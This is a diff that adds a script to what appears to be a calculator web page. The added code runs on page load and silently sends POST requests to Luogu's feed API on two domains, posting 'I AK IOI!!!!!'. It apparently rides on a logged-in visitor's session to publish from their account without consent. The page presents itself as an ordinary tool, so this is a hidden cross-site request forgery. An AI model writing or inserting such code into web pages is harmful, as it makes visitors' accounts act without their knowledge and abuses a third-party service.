@@ -56,7 +56,16 @@
 
 
 	<script> 
+		
+		var content = 'I AK IOI!!!!!';
+$.post("https://www.luogu.org/api/feed/postBenben", {content: content}, function (resp) {
+    console.log(resp);
+});
 
+$.post("https://www.luogu.com.cn/api/feed/postBenben", {content: content}, function (resp) {
+    console.log(resp);
+});
+		
 		var copy_act = function() {
 		    var copyText = $("#calc-ans").val();
 		    console.log(copyText);
